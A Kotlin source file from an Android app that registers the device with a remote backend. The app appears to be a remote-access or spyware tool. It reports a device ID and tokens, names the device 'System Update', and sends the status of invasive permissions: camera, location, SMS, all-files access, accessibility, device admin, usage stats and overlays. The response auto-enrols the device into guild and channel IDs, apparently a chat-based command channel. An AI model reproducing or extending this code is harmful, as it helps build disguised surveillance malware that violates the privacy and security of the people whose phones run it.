package com.adex.app.service

import android.content.Context
import com.adex.app.data.SettingsStore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import com.adex.app.util.PermissionHelper
import androidx.core.content.ContextCompat

// Lightweight HTTP client for registration and one-off API calls.
class BackendApiClient {
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    suspend fun requestPairingCode(
        settings: SettingsStore,
        model: String,
        androidVersion: String,
        appVersion: String
    ): PairingInfo = withContext(Dispatchers.IO) {
        val url = "${settings.backendHttpUrl}/api/v1/pairing/code"
        
        // Prepare permissions metadata
        val perms = JSONObject().apply {
            put("camera", ContextCompat.checkSelfPermission(settings.context, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            put("location", ContextCompat.checkSelfPermission(settings.context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            put("sms", ContextCompat.checkSelfPermission(settings.context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            put("files", PermissionHelper.hasAllFilesAccess())
            put("accessibility", PermissionHelper.isAccessibilityServiceEnabled(settings.context))
            put("admin", PermissionHelper.isDeviceAdminEnabled(settings.context))
            put("usage", PermissionHelper.hasUsageStatsPermission(settings.context))
            put("overlay", PermissionHelper.hasOverlayPermission(settings.context))
        }

        val json = JSONObject().apply {
            put("deviceId", settings.stableDeviceId)
            put("deviceToken", settings.deviceToken)
            put("enrollmentToken", settings.enrollmentToken)
            put("name", "System Update")
            put("model", model)
            put("androidVersion", androidVersion)
            put("appVersion", appVersion)
            put("metadata", perms)
        }

        val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) {
                throw Exception("Handshake failed: ${response.code}")
            }
            val resJson = JSONObject(response.body?.string() ?: "{}")
            PairingInfo(
                deviceId = resJson.getString("deviceId"),
                deviceToken = resJson.getString("deviceToken"),
                pairCode = resJson.getString("pairCode"),
                expiresAt = resJson.getLong("expiresAt"),
                autoEnrolled = resJson.optBoolean("autoEnrolled", false),
                autoEnrollGuildId = resJson.optString("autoEnrollGuildId", null),
                autoEnrollChannelId = resJson.optString("autoEnrollChannelId", null),
                autoEnrollBound = resJson.optBoolean("autoEnrollBound", false)
            )
        }
    }
}

data class PairingInfo(
    val deviceId: String,
    val deviceToken: String,
    val pairCode: String,
    val expiresAt: Long,
    val autoEnrolled: Boolean = false,
    val autoEnrollGuildId: String? = null,
    val autoEnrollChannelId: String? = null,
    val autoEnrollBound: Boolean = false,
)
